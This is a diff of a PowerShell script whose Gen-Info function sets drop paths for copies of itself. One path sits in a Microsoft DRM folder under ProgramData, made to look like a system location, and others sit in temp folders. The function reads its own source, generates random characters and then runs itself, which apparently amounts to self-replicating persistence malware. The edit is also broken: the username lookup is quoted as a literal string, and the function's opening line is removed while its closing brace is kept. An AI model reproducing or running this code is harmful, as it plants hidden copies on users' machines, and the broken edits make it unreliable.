@@ -1,8 +1,12 @@
-function Gen-Info {
-    # CREATION
+# CREATION
+    # Current user
+    $username = "(Get-CimInstance Win32_ComputerSystem).UserName"
+    $username = $username.Split('\')[1]
+
+    # Paths
     $alfa_path = "C:\ProgramData\Microsoft\DRM\alfa.ps1"
     $bravo_path = "C:\Windows\Temp\bravo.ps1"
-    $charlie_path = "$env:LOCALAPPDATA\Temp\charlie.ps1"
+    $charlie_path = "C:\Users\$username\AppData\Local\Temp\charlie.ps1"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
@@ -52,4 +56,3 @@ function Gen-Info {
 }
 
 Gen-Info
-
